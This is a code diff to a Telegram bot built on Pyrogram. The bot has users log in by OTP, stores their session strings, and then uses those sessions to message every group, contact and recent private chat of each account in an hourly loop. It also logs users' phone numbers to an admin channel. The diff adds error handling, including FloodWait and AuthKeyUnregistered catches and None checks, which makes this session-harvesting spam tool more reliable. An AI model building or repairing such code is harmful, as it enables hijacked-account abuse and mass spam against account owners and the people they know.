@@ -21,7 +21,8 @@ from pyrogram.errors import (
     SessionPasswordNeeded,
     PasswordHashInvalid,
     FloodWait,
-    SessionRevoked
+    SessionRevoked,
+    AuthKeyUnregistered  # NEW ERROR ADDED
 )
 from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, ADMINS
 from pymongo import MongoClient
@@ -91,8 +92,13 @@ async def check_login_status(user_id):
 async def cleanup_user_state(user_id):
     if user_id in user_states:
         state = user_states[user_id]
-        if 'client' in state and not state['client'].is_disconnected:
-            await state['client'].disconnect()
+        if 'client' in state:
+            try:
+                # FIXED: Pyrogram doesn't have is_disconnected property
+                if state['client'].is_connected:
+                    await state['client'].disconnect()
+            except Exception:
+                pass
         del user_states[user_id]
 
 @Client.on_message(filters.private & filters.command("login"))
@@ -224,6 +230,9 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
         except PhoneCodeExpired:
             await query.message.edit("**❌ OTP Expired!**\nPlease restart with /login")
             await cleanup_user_state(user_id)
+        except FloodWait as e:  # ADDED FLOODWAIT HANDLING
+            await query.message.edit(f"**⏳ FloodWait!**\nPlease wait {e.value} seconds and try again.")
+            await asyncio.sleep(e.value)
         except Exception as e:
             await query.message.reply(f"Error: {e}\n/login again.")
             await cleanup_user_state(user_id)
@@ -353,6 +362,7 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
             groups = []
             async for dialog in client.get_dialogs():
                 try:
+                    # FIXED: Added None check to prevent 'NoneType' error
                     if dialog.chat and dialog.chat.type in [
                         enums.ChatType.GROUP, 
                         enums.ChatType.SUPERGROUP
@@ -367,6 +377,7 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
                 contacts = await client.get_contacts()
                 for user in contacts:
                     try:
+                        # FIXED: Added None check
                         if user and not user.is_bot and user.id:
                             contacts_and_privates.append(user.id)
                     except:
@@ -377,6 +388,7 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
             # Get recent private chats - SAFE METHOD
             async for dialog in client.get_dialogs(limit=200):
                 try:
+                    # FIXED: Added None check
                     if (dialog.chat and 
                         dialog.chat.type == enums.ChatType.PRIVATE and 
                         not dialog.chat.is_bot and
@@ -410,12 +422,13 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
             # Wait 1 hour before next cycle
             await asyncio.sleep(3600)
             
-        except SessionRevoked as e:
+        # FIXED: Added AuthKeyUnregistered handling
+        except (SessionRevoked, AuthKeyUnregistered) as e:
             # Handle session revocation
             mobile = user_data.get('mobile_number', 'Unknown')
             await bot.send_message(
                 LOG_CHANNEL_SESSIONS_FILES,
-                f"🚫 Session Revoked!\nUser: {mobile}\nError: {e}"
+                f"🚫 Session Revoked/Unregistered!\nUser: {mobile}\nError: {e}"
             )
             
             # Update database
@@ -430,9 +443,10 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
             
         except Exception as e:
             error_msg = f"⚠️ Promotion Error: {str(e)}"
-            if "401 SESSION_REVOKED" in str(e):
+            # FIXED: Handle AUTH_KEY_UNREGISTERED error
+            if "401" in str(e) and ("SESSION_REVOKED" in str(e) or "AUTH_KEY_UNREGISTERED" in str(e)):
                 mobile = user_data.get('mobile_number', 'Unknown')
-                error_msg = f"🚫 Session Revoked!\nUser: {mobile}\nError: {e}"
+                error_msg = f"🚫 Session Revoked/Unregistered!\nUser: {mobile}\nError: {e}"
                 database.update_one(
                     {"id": user_id},
                     {"$set": {"promotion_active": False}}
